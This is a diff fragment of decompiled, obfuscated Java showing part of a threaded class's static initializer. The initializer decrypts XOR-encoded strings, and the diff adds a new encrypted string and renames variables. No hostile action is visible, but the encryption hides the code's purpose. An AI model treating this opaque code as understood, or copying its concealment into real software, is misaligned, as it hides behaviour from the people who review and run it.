@@ -573,6 +573,11 @@ public class d extends Thread {
 
     static {
         String[] var13 = new String[2];
+        boolean var11 = false;
+        String var10 = "úÑ\u0017tµ9\u000b_ÉÛ.\u0003º·y³ß\u0081";
+        byte var12 = 18;
+        byte var9 = 6;
+        byte var8 = -1;
         i = var13;
         long var0 = 107634029375693L;
         long[] var6 = new long[5];
@@ -581,7 +586,7 @@ public class d extends Thread {
         byte var5 = 24;
         byte var2 = 0;
 
-        label20:
+        label35:
         while (true) {
             int var10001 = var2;
             var2 += 8;
@@ -599,10 +604,10 @@ public class d extends Thread {
             byte var10003 = -1;
 
             while (true) {
-                long var19 = var10002 ^ var0;
+                long var20 = var10002 ^ var0;
                 switch (var10003) {
                     case 0:
-                        var10000[var10001] = var19;
+                        var10000[var10001] = var20;
                         if (var2 >= var5) {
                             k = var6;
                             l = new Integer[5];
@@ -611,9 +616,9 @@ public class d extends Thread {
                         }
                         break;
                     default:
-                        var10000[var10001] = var19;
+                        var10000[var10001] = var20;
                         if (var2 < var5) {
-                            continue label20;
+                            continue label35;
                         }
 
                         var4 = ">\u0099\u0092í\u0001\n\u0081U\u008a±Å\u001bæLÈ-";
@@ -621,9 +626,9 @@ public class d extends Thread {
                         var2 = 0;
                 }
 
-                byte var16 = var2;
+                byte var17 = var2;
                 var2 += 8;
-                var7 = var4.substring(var16, var2).getBytes("ISO-8859-1");
+                var7 = var4.substring(var17, var2).getBytes("ISO-8859-1");
                 var10000 = var6;
                 var10001 = var3++;
                 var10002 = ((long)var7[0] & 255L) << 56
